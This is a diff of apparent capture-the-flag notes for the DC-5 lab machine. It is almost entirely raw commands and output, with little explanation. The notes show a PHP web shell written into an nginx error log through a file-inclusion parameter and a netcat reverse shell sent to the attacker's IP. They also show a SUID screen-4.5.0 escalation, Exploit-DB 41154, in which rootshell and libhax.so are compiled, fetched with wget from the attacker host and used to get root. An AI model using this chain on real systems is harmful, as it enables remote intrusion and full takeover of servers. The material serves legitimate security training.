@@ -35,4 +35,153 @@ Nmap done: 1 IP address (1 host up) scanned in 15.26 seconds
 
 
 
+abusing var/log/nginx/error.log
+Burp Suite
+<?php system($_GET['cmd']) ?>
+
+192.168.43.2/thankyou.php?file=/var/log/nginx/error.log&cmd=nc%20-e%20/bin/bash%20192.168.43.254%204444
+
+root@kali:~# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.43.254] from (UNKNOWN) [192.168.43.2] 59617
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+LinPEAS.sh
+-rwsr-xr-x 1 root   root        1.4M Apr 19  2019 /bin/screen-4.5.0
+
+
+https://www.exploit-db.com/exploits/41154
+
+root@kali:~/CTF/DC_5# vim libhax.c
+root@kali:~/CTF/DC_5# vim rootshell.c
+root@kali:~/CTF/DC_5# 411toppm 
+41154.sh     libhax.c     notes.txt    rootshell.c  
+root@kali:~/CTF/DC_5# 411toppm 
+41154.sh     libhax.c     notes.txt    rootshell.c  
+root@kali:~/CTF/DC_5# rm 41154.sh 
+root@kali:~/CTF/DC_5# vim 41154.sh
+root@kali:~/CTF/DC_5# 
+root@kali:~/CTF/DC_5# gcc -fPIC -shared -ldl -o libhax.so libhax.c
+libhax.c: In function ‘dropshell’:
+libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
+    7 |     chmod("/tmp/rootshell", 04755);
+      |     ^~~~~
+root@kali:~/CTF/DC_5# gcc -o rootshell rootshell.c
+rootshell.c: In function ‘main’:
+rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    3 |     setuid(0);
+      |     ^~~~~~
+rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    4 |     setgid(0);
+      |     ^~~~~~
+rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
+    5 |     seteuid(0);
+      |     ^~~~~~~
+rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
+    6 |     setegid(0);
+      |     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+    7 |     execvp("/bin/sh", NULL, NULL);
+      |     ^~~~~~
+rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
+root@kali:~/CTF/DC_5# 
+root@kali:~/CTF/DC_5# 
+root@kali:~/CTF/DC_5# 
+root@kali:~/CTF/DC_5# ll
+totale 52
+-rw-r--r-- 1 root root   247 18 apr 20.15 41154.sh
+-rw-r--r-- 1 root root   252 18 apr 20.14 libhax.c
+-rwxr-xr-x 1 root root 16136 18 apr 20.15 libhax.so
+-rw-r--r-- 1 root root  1696 18 apr 20.09 notes.txt
+-rwxr-xr-x 1 root root 16816 18 apr 20.15 rootshell
+-rw-r--r-- 1 root root   134 18 apr 20.14 rootshell.c
+root@kali:~/CTF/DC_5# cp rootshell /root/
+root@kali:~/CTF/DC_5# cp libhax.so /root/
+root@kali:~/CTF/DC_5# cp 41154.sh /root/
+root@kali:~/CTF/DC_5# 
+
+www-data@dc-5:/tmp$ wget 192.168.43.254/41154.sh
+wget 192.168.43.254/41154.sh
+converted 'http://192.168.43.254/41154.sh' (ANSI_X3.4-1968) -> 'http://192.168.43.254/41154.sh' (UTF-8)
+--2021-04-19 04:16:25--  http://192.168.43.254/41154.sh
+Connecting to 192.168.43.254:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 247 [text/x-sh]
+Saving to: '41154.sh'
+
+41154.sh            100%[=====================>]     247  --.-KB/s   in 0s     
+
+2021-04-19 04:16:25 (38.8 MB/s) - '41154.sh' saved [247/247]
+
+www-data@dc-5:/tmp$ wget 192.168.43.254/rootshell
+wget 192.168.43.254/rootshell
+converted 'http://192.168.43.254/rootshell' (ANSI_X3.4-1968) -> 'http://192.168.43.254/rootshell' (UTF-8)
+--2021-04-19 04:16:30--  http://192.168.43.254/rootshell
+Connecting to 192.168.43.254:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16816 (16K) [application/octet-stream]
+Saving to: 'rootshell'
+
+rootshell           100%[=====================>]  16.42K  --.-KB/s   in 0s     
+
+2021-04-19 04:16:30 (128 MB/s) - 'rootshell' saved [16816/16816]
+
+www-data@dc-5:/tmp$ wget 192.168.43.254/libhax.so
+wget 192.168.43.254/libhax.so
+converted 'http://192.168.43.254/libhax.so' (ANSI_X3.4-1968) -> 'http://192.168.43.254/libhax.so' (UTF-8)
+--2021-04-19 04:16:39--  http://192.168.43.254/libhax.so
+Connecting to 192.168.43.254:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16136 (16K) [application/octet-stream]
+Saving to: 'libhax.so'
+
+libhax.so           100%[=====================>]  15.76K  --.-KB/s   in 0s     
+
+2021-04-19 04:16:39 (98.1 MB/s) - 'libhax.so' saved [16136/16136]
+
+www-data@dc-5:/tmp$ 
+
+www-data@dc-5:/tmp$ chmod +x 41154.sh
+chmod +x 41154.sh
+www-data@dc-5:/tmp$ ./411*
+./411*
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-www-data.
+
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# cd /root
+cd /root
+# ls
+ls
+thisistheflag.txt
+# cat thisistheflag.txt
+cat thisistheflag.txt
+
+
+888b    888 d8b                                                      888      888 888 888 
+8888b   888 Y8P                                                      888      888 888 888 
+88888b  888                                                          888      888 888 888 
+888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
+888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
+888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
+888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
+888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
+                                                                                          
+                                                                                          
+
+
+Once again, a big thanks to all those who do these little challenges,
+and especially all those who give me feedback - again, it's all greatly
+appreciated.  :-)
+
+I also want to send a big thanks to all those who find the vulnerabilities
+and create the exploits that make these challenges possible.
+
+# 
 
